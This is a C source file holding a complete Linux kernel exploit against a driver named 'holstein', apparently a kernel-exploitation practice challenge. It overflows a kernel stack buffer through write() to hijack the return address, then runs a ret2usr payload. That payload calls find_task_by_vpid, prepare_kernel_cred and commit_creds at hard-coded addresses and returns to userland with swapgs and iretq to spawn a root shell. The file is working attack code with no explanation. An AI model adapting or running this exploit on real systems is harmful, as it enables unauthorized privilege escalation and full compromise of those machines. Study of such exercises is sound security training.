#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>


int global_fd;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void open_dev(char *name){
  char devname[100] = "/dev/";
  strcat(devname, name);
  global_fd = open(devname, O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
    puts("[*] Opened device");
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long shell_addr = (unsigned long)get_shell;

void my_jump(void) { // needed because of stack alignment
    __asm__(
        ".intel_syntax noprefix;"
        "mov rax, shell_addr;"
        "push rax;"
        "ret;"
        ".att_syntax;"
    );
}

unsigned long user_rip = (unsigned long)my_jump;

void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov rdi, 0x1;" // process id = 1
        "movabs rax, 0xffffffff81068d40;" // find_task_by_vpid
        "call rax;" // call find_task_by_vpid
        "mov rdi, rax;" // mov resulting daemon into rdi
        "movabs rax, 0xffffffff8106e240;" //prepare_kernel_cred
	      "call rax;" // call prepare_kernel_cred
        "mov rdi, rax;" // mov result into rdi
	      "movabs rax, 0xffffffff8106e390;" //commit_creds
	      "call rax;" // call commit_creds
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

void overflow() {
  char buf[0x420];
  memset(buf, 'A', 0x400);
  *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privs;
  write(global_fd, buf, 0x410);
}

int main() {

  save_state();

  open_dev("holstein");

  overflow();

  puts("[!] end of main");

  return 0;
  }